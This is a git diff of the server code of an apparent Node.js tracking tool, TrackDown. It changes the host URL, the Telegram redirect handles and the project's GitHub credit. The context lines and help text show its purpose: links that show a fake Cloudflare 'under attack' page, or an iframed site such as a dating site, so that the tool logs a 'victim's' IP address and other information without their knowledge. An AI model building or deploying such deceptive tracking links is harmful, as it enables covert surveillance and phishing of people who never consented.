@@ -15,7 +15,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="https://trackdown-oer9.onrender.com";
+var hostURL="YOUR URL";
 //TOGGLE for Shorters
 var use1pt=false;
 
@@ -31,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/hacked_pro");
+res.redirect("https://t.me/kingofak");
 }
 
          
@@ -44,13 +44,12 @@ var d = new Date();
 d=d.toJSON().slice(0,19).replace('T',':');
 if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
 
-  
 
 if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/hacked_pro");
+res.redirect("https://t.me/kingofak");
 }
 
          
@@ -86,7 +85,7 @@ the url it will send you 2 links which you can use to track people.
 \n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
 \n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
 ( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/hacked_pro/TrackDown
+\n\nThe project is OSS at: https://github.com/Th30neAnd0nly/TrackDown
 `);
 }
   
